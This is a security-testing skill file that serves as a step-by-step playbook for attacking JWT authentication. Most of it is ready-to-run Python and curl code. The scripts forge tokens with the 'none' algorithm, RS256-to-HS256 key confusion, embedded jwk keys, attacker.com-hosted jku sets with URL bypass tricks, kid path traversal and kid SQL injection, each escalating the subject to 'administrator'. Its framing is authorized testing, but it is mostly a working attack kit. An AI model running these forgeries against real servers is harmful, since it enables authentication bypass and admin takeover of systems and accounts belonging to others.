---
name: authentication-jwt
description: JWT security testing covering algorithm confusion attacks, key injection via kid/jku/jwk headers, none algorithm bypass, token forgery, claim manipulation, and ready-to-use Python scripts
---

# JWT Authentication — Expert-Level Testing

JWT (JSON Web Token) is the dominant authentication mechanism for APIs and SPAs. Misconfigurations in signature verification, algorithm handling, and key management lead to complete authentication bypass and token forgery.

## Step 1: Decode and Analyze the Token

```bash
# Decode JWT without verification
echo "PASTE_JWT_HERE" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Decode header
echo "PASTE_JWT_HERE" | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool

# Full decode with python (handles padding)
python3 -c "
import base64, json, sys
token = 'PASTE_JWT_HERE'
parts = token.split('.')
for i, part in enumerate(parts[:2]):
    # Fix padding
    padded = part + '=' * (4 - len(part) % 4)
    decoded = base64.urlsafe_b64decode(padded)
    name = 'Header' if i == 0 else 'Payload'
    print(f'{name}: {json.dumps(json.loads(decoded), indent=2)}')
"
```

## Step 2: "none" Algorithm Attack

```python
#!/usr/bin/env python3
"""JWT 'none' algorithm bypass — forge token with no signature."""
import base64, json

# Original token
original = "PASTE_JWT_HERE"
header_b64, payload_b64, sig = original.split('.')

# Decode payload, modify claims
payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '=='))
payload['sub'] = 'administrator'  # Change user to admin
# payload['role'] = 'admin'  # Or modify role claim

# Create "none" algorithm header
header = {"alg": "none", "typ": "JWT"}

# Encode
def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

forged = f"{b64url(header)}.{b64url(payload)}."
print(f"Forged token: {forged}")

# Test variations the server might accept
for alg in ["none", "None", "NONE", "nOnE"]:
    header["alg"] = alg
    token = f"{b64url(header)}.{b64url(payload)}."
    print(f"  alg={alg}: {token}")
```

```bash
# Quick one-liner: forge none algorithm token
python3 -c "
import base64,json
h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
p=base64.urlsafe_b64decode('PASTE_PAYLOAD_B64' + '==')
payload=json.loads(p)
payload['sub']='administrator'
p2=base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
print(f'{h}.{p2}.')
"

# Test the forged token
curl -sk "https://TARGET/admin" -H "Authorization: Bearer FORGED_TOKEN_HERE"
curl -sk "https://TARGET/admin" -H "Cookie: session=FORGED_TOKEN_HERE"
```

## Step 3: Algorithm Confusion — RS256 → HS256

The server verifies RS256 tokens with the public key. If you change `alg` to HS256, the server may use the **public key** as the HMAC secret — and you HAVE the public key.

```python
#!/usr/bin/env python3
"""RS256 → HS256 algorithm confusion attack."""
import base64, json, hmac, hashlib

# Step 1: Get the server's public key
# Usually at: /.well-known/jwks.json, /jwks.json, or /oauth2/keys
# Or extract from the JWT header's jku/x5u URL

PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
PASTE_SERVER_PUBLIC_KEY_HERE
-----END PUBLIC KEY-----"""

# Step 2: Decode original token
original = "PASTE_JWT_HERE"
_, payload_b64, _ = original.split('.')

# Modify payload
payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '=='))
payload['sub'] = 'administrator'

# Step 3: Create HS256 header
header = {"alg": "HS256", "typ": "JWT"}

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

h = b64url(json.dumps(header))
p = b64url(json.dumps(payload))
signing_input = f"{h}.{p}"

# Step 4: Sign with the public key as HMAC secret
sig = hmac.new(PUBLIC_KEY.encode(), signing_input.encode(), hashlib.sha256).digest()
s = b64url(sig)

forged = f"{h}.{p}.{s}"
print(f"Forged HS256 token: {forged}")
```

```bash
# Get the public key from JWKS endpoint
curl -sk "https://TARGET/.well-known/jwks.json" | python3 -m json.tool

# Convert JWK to PEM (needed for algorithm confusion)
python3 -c "
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

# Paste JWK here
jwk = {'n': 'PASTE_N_VALUE', 'e': 'PASTE_E_VALUE', 'kty': 'RSA'}

def b64url_decode(s):
    return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))

n = int.from_bytes(b64url_decode(jwk['n']), 'big')
e = int.from_bytes(b64url_decode(jwk['e']), 'big')

pub = rsa.RSAPublicNumbers(e, n).public_key()
pem = pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
print(pem.decode())
"
```

## Step 4: Key Injection via jwk Header

Some libraries allow the JWT to specify its own verification key via the `jwk` header parameter:

```python
#!/usr/bin/env python3
"""JWT jwk header injection — embed attacker key in the token itself."""
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
import base64, json

# Generate attacker's RSA key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Extract public key numbers for JWK
pub_numbers = public_key.public_numbers()
def int_to_b64url(n, length=None):
    b = n.to_bytes((n.bit_length() + 7) // 8, 'big') if length is None else n.to_bytes(length, 'big')
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

jwk = {
    "kty": "RSA",
    "n": int_to_b64url(pub_numbers.n),
    "e": int_to_b64url(pub_numbers.e),
}

# Create JWT header with embedded JWK
header = {"alg": "RS256", "typ": "JWT", "jwk": jwk}
payload = {"sub": "administrator", "iat": 1700000000, "exp": 1800000000}

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

h = b64url(header)
p = b64url(payload)
signing_input = f"{h}.{p}".encode()

# Sign with attacker's private key
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
sig = private_key.sign(signing_input, asym_padding.PKCS1v15(), hashes.SHA256())
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

forged = f"{h}.{p}.{s}"
print(f"Forged token with embedded JWK: {forged}")
```

## Step 5: Key Injection via jku Header

```python
#!/usr/bin/env python3
"""JWT jku header injection — point to attacker-hosted JWKS."""
# Step 1: Generate a key pair and JWKS
# Step 2: Host the JWKS at https://attacker.com/.well-known/jwks.json
# Step 3: Set jku in JWT header to your JWKS URL
# Step 4: Server fetches YOUR JWKS and verifies with YOUR key

# The attack works if the server doesn't validate that jku points to a trusted URL

# Header: {"alg":"RS256","typ":"JWT","jku":"https://attacker.com/.well-known/jwks.json","kid":"my-key"}
# Host a JWKS at attacker.com with the matching key

# URL tricks to bypass jku validation
# https://TARGET/.well-known/jwks.json → expected
# https://TARGET/.well-known/jwks.json@attacker.com → domain confusion  
# https://TARGET/.well-known/jwks.json#attacker/jwks → fragment
# https://TARGET/.well-known/../redirect?url=https://attacker.com/jwks → open redirect chain
```

## Step 6: kid (Key ID) Injection

```bash
# kid path traversal → point to a file with known content
# Use /dev/null (empty file → empty signing key)
python3 -c "
import base64, json, hmac, hashlib

header = {'alg': 'HS256', 'typ': 'JWT', 'kid': '../../../dev/null'}
payload = {'sub': 'administrator'}

def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()

h, p = b64url(header), b64url(payload)
sig = hmac.new(b'', f'{h}.{p}'.encode(), hashlib.sha256).digest()
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f'{h}.{p}.{s}')
"

# kid SQLi (if kid is looked up in database)
python3 -c "
import base64, json, hmac, hashlib

# kid value injected as SQL, returns known key value
header = {'alg': 'HS256', 'typ': 'JWT', 'kid': \"' UNION SELECT 'secret123' -- \"}
payload = {'sub': 'administrator'}

def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()

h, p = b64url(header), b64url(payload)
sig = hmac.new(b'secret123', f'{h}.{p}'.encode(), hashlib.sha256).digest()
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f'{h}.{p}.{s}')
"
```

## Step 7: Claim Manipulation

```bash
# After forging signature (via any method above), modify claims for escalation:

# Sub claim — impersonate another user
# "sub": "administrator"

# Role claim — escalate privileges
# "role": "admin"  or  "admin": true

# Exp claim — extend token lifetime
# "exp": 9999999999

# Aud claim — cross-service token reuse
# Remove or change "aud" to target service

# Token confusion — use ID token as access token
# Some APIs only check signature, not token type
```

## Testing Methodology

1. **Capture JWT** — from Authorization header, cookies, or response body
2. **Decode and analyze** — check alg, claims, kid, jku, jwk headers
3. **Test "none" algorithm** — remove signature, set alg to none
4. **Test algorithm confusion** — change RS256 to HS256, sign with public key
5. **Test jwk injection** — embed attacker's public key in the header
6. **Test jku injection** — point to attacker-hosted JWKS
7. **Test kid injection** — path traversal, SQL injection in kid value
8. **Test claim manipulation** — modify sub, role, admin, exp claims
9. **Test token confusion** — use ID token where access token is expected
10. **Fetch JWKS** — `/.well-known/jwks.json` for public key extraction

## Validation

1. Forged token accepted by the server → access to admin functionality
2. Algorithm confusion: HS256 token signed with public RSA key is accepted
3. Claim escalation: modified sub/role claim grants unauthorized access
4. Key injection: server fetches and trusts attacker-controlled keys

## Impact

- **Critical**: Authentication bypass — access any account via token forgery
- **Critical**: Admin takeover — escalate to administrator via claim manipulation
- **High**: Cross-service token reuse — access other APIs with wrong audience
- **Medium**: Token lifetime extension — persistent access via exp manipulation

## Pro Tips

1. **Always try "none" algorithm first** — simplest attack, still works on misconfigured servers
2. **RS256→HS256 confusion** is the #1 expert-level JWT attack — requires the public key
3. **kid path traversal to /dev/null** — signs with empty key, works if server uses file-based key lookup
4. **jwk header injection** — server trusts the key embedded in the token itself
5. **JWKS endpoint** often at `/.well-known/jwks.json` — exposes public keys needed for attack
6. **Test both Authorization header and Cookie** — JWT can be stored in either
7. **Python scripts are self-contained** — save to file and run, no external tools needed
8. **jwt_tool** (ticarpi/jwt_tool on GitHub) automates most attacks if available
9. **Token confusion** works because many APIs only verify the signature, not audience or type
10. **kid SQLi** is rare but devastating — if kid is used in a database query, inject SQL to control the key value
